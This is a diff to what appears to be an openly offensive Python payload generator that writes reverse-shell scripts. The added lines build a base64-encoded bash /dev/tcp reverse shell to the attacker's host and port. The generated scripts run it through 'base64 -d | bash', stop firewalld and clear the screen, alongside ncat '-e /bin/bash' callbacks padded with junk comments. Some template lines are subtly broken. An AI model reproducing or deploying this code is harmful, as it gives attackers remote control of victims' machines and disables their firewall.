@@ -71,6 +71,9 @@ Advanced ncat payload modules>>>>
 s=f"ncat {lhost} {lport} -e /bin/bash"
 encoded=base64.b64encode(s.encode("utf-8"))
 encodeds=encoded.decode("utf-8")
+rshell=f"setsid bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+encodedrshell=base64.b64encode(rshell.encode("utf-8"))
+encodedrshells=encodedrshell.decode("utf-8")
 print("\033[1;35 ")
 payload=input("frsf(choose payload)#> ")
 if payload=="a" or payload=="A":
@@ -159,13 +162,12 @@ elif payload=="6":
 #jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
 #kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
 #kjkasjhkjhhugkjfoldll
-os.system("sudo apt-get install nmap -y &> /dev/null")
+os.system("base64 -d <<< {encodedrshells} | bash")
 #lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
 #kjhbskjhgsajkdhjkshda
 #lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
-os.system("sudo apt-get install ncat -y &> /dev/null")
+os.system("clear")
 #jhkjhjkhgkjhgkjhgjdkjhfjld
-os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
 	""")
 	f=open(f"{output}/{name}.py","w+")
@@ -183,7 +185,7 @@ os.system("sudo pacman -S install nmap -y &> /dev/null")
 #lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
 os.system("sudo pacman -S install ncat -y &> /dev/null")
 #jhkjhjkhgkjhgkjhgjdkjhfjld
-os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
+os.system("ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
 	""")
 	f=open(f"{output}/{name}.py","w+")
@@ -200,7 +202,7 @@ os.system("sudo dnf install nmap-ncat -y &> /dev/null")
 #kjhbskjhgsajkdhjkshda
 #lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
 #jhkjhjkhgkjhgkjhgjdkjhfjld
-os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
+os.system("ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
 	""")
 	f=open(f"{output}/{name}.py","w+")
@@ -212,12 +214,13 @@ elif payload=="9":
 #jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
 #kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
 #kjkasjhkjhhugkjfoldll
-os.system("sudo yum install nmap-ncat -y &> /dev/null")
 #lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
 #kjhbskjhgsajkdhjkshda
+os.system("systemctl stop firewalld")
 #lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
 #jhkjhjkhgkjhgkjhgjdkjhfjld
-os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
+os.system("base64 -d <<< {encodedrshells} | bash")
+os.system("clear")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
 	""")
 	f=open(f"{output}/{name}.py","w+")
@@ -240,7 +243,7 @@ os.system("base64 -d <<< YXB0IGluc3RhbGwgdGVybXV4LWFwaQo= | bash")
 #jjkslshdfrsnqrewcsh
 os.system("apt-get install ncat -y &> /dev/null")
 #jhkjhjkhgkjhgkjhgjdkjhfjld
-os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
+os.system("ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
 	""")
 	f=open(f"{output}/{name}.py","w+")
